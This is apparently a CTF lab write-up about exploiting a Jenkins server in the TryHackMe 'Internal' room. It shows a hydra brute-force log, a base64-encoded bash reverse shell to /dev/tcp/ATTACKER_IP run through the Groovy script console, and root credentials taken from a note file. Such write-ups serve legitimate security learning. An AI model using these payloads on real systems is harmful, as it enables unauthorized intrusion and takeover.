---
sidebar_position: 3
title: Jenkins Exploitation
description: Internal
keywords: [internal, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, wpscan, privilege escalation, jenkins]
---


- <b style={{ color: 'FireBrick' }}>Jenkins</b> <span style={{fontWeight: 'Bold'}}>Login Portal:</span> <b style={{ color: 'SandyBrown' }}>[LOCAL:8080]</b>

![IA](/img/vmlinux/i-jenkins.png)


<br/>

- Using `hydra` to Brute-Force <b style={{ color: 'FireBrick' }}>Jenkins</b> Login-Form: <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>spongebob</b>

```log
[DATA] attacking http-post-form://10.11.30.40:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid
[8080][http-post-form] host: 10.11.30.40   login: admin   password: spongebob
```

<br/>

- <span style={{fontWeight: 'Bold'}}>We can Execute</span> <b style={{ color: 'DarkGrey' }}>Groovy Scripts</b> <span style={{fontWeight: 'Bold'}}>at this Location:</span> <b style={{ color: 'SandyBrown' }}>[LOCAL:8080/script]</b>

![IA](/img/vmlinux/i-scriptconsole.png)



<br/>

- Encoding the **PAYLOAD** In `Base64`

```bash
┌─────────────────────────────────────────────────────┐    ┌──────────────────────────────────────────────────────────────────────┐
| bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | -► | YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4zMC40MC80NDQ1IDA+JjEn |
└─────────────────────────────────────────────────────┘    └──────────────────────────────────────────────────────────────────────┘
```


```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS43Mi41Ny80NDQ1IDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

<br/>
<br/>

- **We can catch the Reverse Shell Using `netcat`**
- **File: `/opt/note.txt`** 
- <span style={{fontWeight: 'Bold'}}>Contains Credentials of</span> <b style={{ color: 'Red' }}>ROOT:</b> <b style={{ color: 'Chartreuse' }}>root</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>tr0ub13guM!@#123</b>

```bash {9}
jenkins@jenkins /$ id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
jenkins@jenkins /$ cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  
Use them if you need access to the root user account.

root:tr0ub13guM!@#123
```

```bash
aubreanna@internal:~$ su - root
Password: 
root@internal:~$ id
uid=0(root) gid=0(root) groups=0(root)
```
---